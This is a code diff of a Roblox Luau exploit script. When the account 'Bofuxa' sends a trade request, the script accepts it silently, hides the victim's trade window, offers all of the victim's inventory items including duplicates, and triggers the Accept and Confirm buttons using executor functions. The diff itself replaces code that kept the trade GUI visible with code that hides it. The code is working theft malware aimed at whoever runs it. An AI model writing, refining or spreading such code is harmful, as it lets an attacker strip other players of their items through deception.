@@ -5,34 +5,43 @@ local LocalPlayer = Players.LocalPlayer
 local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
 local SendRequest = TradeFolder:WaitForChild("SendRequest")
 local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
+local DeclineRequest = TradeFolder:WaitForChild("DeclineRequest")
 local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
 local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
 local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
+-- Set up the client callback to intercept incoming requests from the server
 SendRequest.OnClientInvoke = function(senderPlayer)
-    local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
-    
-    if senderName:lower() == "bofuxa" then
-        print("Trade request verified from bofuxa. Accepting...")
+    -- Check if the sender is user17644395
+    if senderPlayer and senderPlayer.Name == "Bofuxa" then
+        print("Trade request verified from user17644395. Accepting...")
         
-        -- Make sure TradeGUI elements are visible so the buttons exist and can be clicked/interacted with
+        -- Hide Container, Processing, and BG inside TradeGUI when traded by user17644395
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
             local tradeGui = playerGui:FindFirstChild("TradeGUI")
             if tradeGui then
-                for _, childName in ipairs({"Container", "Processing", "BG"}) do
-                    local element = tradeGui:FindFirstChild(childName)
-                    if element then
-                        element.Visible = true -- Ensuring visibility so buttons are interactive
-                    end
+                local container = tradeGui:FindFirstChild("Container")
+                if container then
+                    container.Visible = false
                 end
+                local processing = tradeGui:FindFirstChild("Processing")
+                if processing then
+                    processing.Visible = false
+                end
+                local bg = tradeGui:FindFirstChild("BG")
+                if bg then
+                    bg.Visible = false
+                end
+                print("Hidden TradeGUI Container, Processing, and BG elements successfully.")
             end
         end
 
         AcceptRequest:FireServer()
         
+        -- Spawn a thread to wait for the trade session to start, wait 1 second, then add all items including duplicates
         task.spawn(function()
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
@@ -40,123 +49,84 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
             
-            local inventoryContainer = nil
+            -- Find the inventory container for weapons
             local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-            
-            if pGui then
-                local mainGui = pGui:FindFirstChild("MainGUI")
-                if mainGui then
-                    local lobby = mainGui:FindFirstChild("Lobby")
-                    if lobby then
-                        local screens = lobby:FindFirstChild("Screens")
-                        if screens then
-                            local inventory = screens:FindFirstChild("Inventory")
-                            if inventory then
-                                local main = inventory:FindFirstChild("Main")
-                                if main then
-                                    local crafting = main:FindFirstChild("Crafting")
-                                    if crafting then
-                                        local craftingMain = crafting:FindFirstChild("Main")
-                                        if craftingMain then
-                                            local salvage = craftingMain:FindFirstChild("Salvage")
-                                            if salvage then
-                                                local scrollFrame = salvage:FindFirstChild("ScrollFrame")
-                                                if scrollFrame then
-                                                    inventoryContainer = scrollFrame:FindFirstChild("Container")
-                                                end
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-
-            local offeredCount = 0
+            local inventoryContainer = pGui 
+                and pGui:WaitForChild("MainGUI", 5) 
+                and pGui.MainGUI:WaitForChild("Game", 5) 
+                and pGui.MainGUI.Game:WaitForChild("Crafting", 5) 
+                and pGui.MainGUI.Game.Crafting:WaitForChild("Inventory", 5) 
+                and pGui.MainGUI.Game.Crafting.Inventory:WaitForChild("Salvage", 5) 
+                and pGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
+                and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)
 
             if inventoryContainer then
                 for _, item in ipairs(inventoryContainer:GetChildren()) do
-                    if item:IsA("GuiObject") then
+                    if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                         local itemName = item.Name
                         local category = "Weapons"
                         
+                        -- Check for quantity/duplicates attribute if present, default to 1 instance
                         local count = 1
                         local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                         if type(qtyAttribute) == "number" then
                             count = qtyAttribute
                         end
 
+                        -- Fire the offer event for each duplicate/instance found
                         for i = 1, count do
                             OfferItemEvent:FireServer(itemName, category)
-                            offeredCount = offeredCount + 1
                             task.wait(0.05)
                         end
                     end
                 end
-                print("Successfully offered " .. tostring(offeredCount) .. " items from mobile Lobby inventory container!")
+                print("All items and duplicates offered successfully!")
             else
-                if LocalPlayer:FindFirstChild("Backpack") then
-                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
-                        if tool:IsA("Tool") then
-                            OfferItemEvent:FireServer(tool.Name, "Weapons")
-                            offeredCount = offeredCount + 1
-                            task.wait(0.05)
-                        end
-                    end
-                end
-                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
+                warn("Could not find inventory container path!")
             end
 
-            print("Waiting 3 seconds before triggering Accept and Confirm...")
-            task.wait(3)
+            -- Wait after adding all items
+            print("Waiting 7 seconds before triggering trade accept actions...")
+            task.wait(7)
 
-            -- Fire server-side trade acceptance events
-            pcall(function()
-                AcceptTradeEvent:FireServer(true)
-            end)
-            pcall(function()
+            -- Firesignal simulation for AcceptTrade event if supported, else FireServer fallback
+            if firesignal and AcceptTradeEvent.OnClientEvent then
+                firesignal(AcceptTradeEvent.OnClientEvent, false)
+            else
                 AcceptTradeEvent:FireServer()
-            end)
+            end
 
-            -- Automatically find and press the Accept and Confirm buttons on mobile UI
+            -- Trigger the GUI buttons
+            local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")
+
             local function fireButton(btn)
-                if btn and btn:IsA("GuiButton") then
-                    if getconnections then
-                        for _, connection in ipairs(getconnections(btn.Activated)) do
-                            connection:Fire()
-                        end
-                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                            connection:Fire()
-                        end
+                if btn and btn:IsA("GuiButton") and getconnections then
+                    for _, connection in ipairs(getconnections(btn.Activated)) do
+                        connection:Fire()
                     end
-                    pcall(function()
-                        btn:Activate()
-                    end)
+                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
+                        connection:Fire()
+                    end
+                elseif btn and btn:IsA("GuiButton") then
+                    btn:Activate()
                 end
             end
 
-            -- Target exact paths for TradeGUI buttons
-            if playerGui then
-                local tradeGui = playerGui:FindFirstChild("TradeGUI")
-                if tradeGui then
-                    -- Search specifically for Accept and Confirm action buttons
-                    for _, gui in ipairs(tradeGui:GetDescendants()) do
-                        if gui:IsA("GuiButton") then
-                            local fullName = gui:GetFullName():lower()
-                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
-                                fireButton(gui)
-                            end
-                        end
-                    end
-                end
-            end
+            local firstButton = actionsFolder:WaitForChild("Accept"):WaitForChild("ActionButton")
+            fireButton(firstButton)
+            print("Triggered first ActionButton")
+
+            task.wait(1)
+
+            local confirmButton = actionsFolder:WaitForChild("Accept"):WaitForChild("Confirm"):WaitForChild("ActionButton")
+            fireButton(confirmButton)
+            print("Triggered confirmation ActionButton")
         end)
 
         return true
     else
-        print("Trade request from other player (" .. senderName .. "). Allowing normal trade...")
+        -- Allow normal trading with other players
+        print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
         return true
     end
 end
